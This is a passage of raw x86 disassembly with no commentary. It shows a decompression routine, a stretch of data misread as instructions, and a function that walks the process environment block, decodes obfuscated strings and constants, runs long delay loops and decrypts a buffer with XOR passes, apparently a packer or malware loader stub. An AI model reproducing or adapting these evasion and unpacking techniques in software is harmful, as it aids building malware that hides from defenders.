  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
